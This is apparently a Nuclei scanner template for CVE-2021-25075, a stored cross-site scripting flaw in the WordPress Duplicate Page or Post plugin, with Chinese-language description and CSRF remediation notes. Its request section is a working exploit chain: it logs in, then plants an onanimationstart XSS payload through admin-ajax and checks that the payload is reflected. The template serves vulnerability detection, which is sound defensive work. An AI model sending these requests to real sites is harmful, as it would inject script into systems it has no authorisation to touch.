id: CVE-2021-25075
info:
  name: WordPress Duplicate Page or Post < 1.5.1 - Stored XSS
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Duplicate Page or Post 跨站脚本伪造
    WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是WordPress开源的一个应用插件。

    WordPress plugin Duplicate Page or Post 插件 1.5.1之前版本存在安全漏洞，该漏洞源于插件没有CSRF检查，攻击者可利用该漏洞执行跨站点脚本攻击。
  severity: low
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://wpscan.com/vulnerability/db5a0431-af4d-45b7-be4e-36b6c90a601b

    临时修复方案：
    1、令牌同步模式\n令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（英语：token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子【英语：random seed】的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌则无法通过验证。
    2、检查Referer字段\nHTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。
    3、添加校验token\n由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再运行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - style=animation-name:rotation onanimationstart=alert(/XSS/) p
    - toplevel_page_wpda_duplicate_post_menu
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /wp-login.php HTTP/1.1
    Host: {{Hostname}}
    Origin: {{RootURL}}
    Content-Type: application/x-www-form-urlencoded
    Cookie: wordpress_test_cookie=WP%20Cookie%20check

    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
  - |
    POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Cookie: wordpress_test_cookie=WP%20Cookie%20check

    action=wpdevart_duplicate_post_parametrs_save_in_db&title_prefix=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2fXSS%2f%29+p
  - |
    GET /wp-admin/admin.php?page=wpda_duplicate_post_menu HTTP/1.1
    Host: {{Hostname}}
  cookie-reuse: true
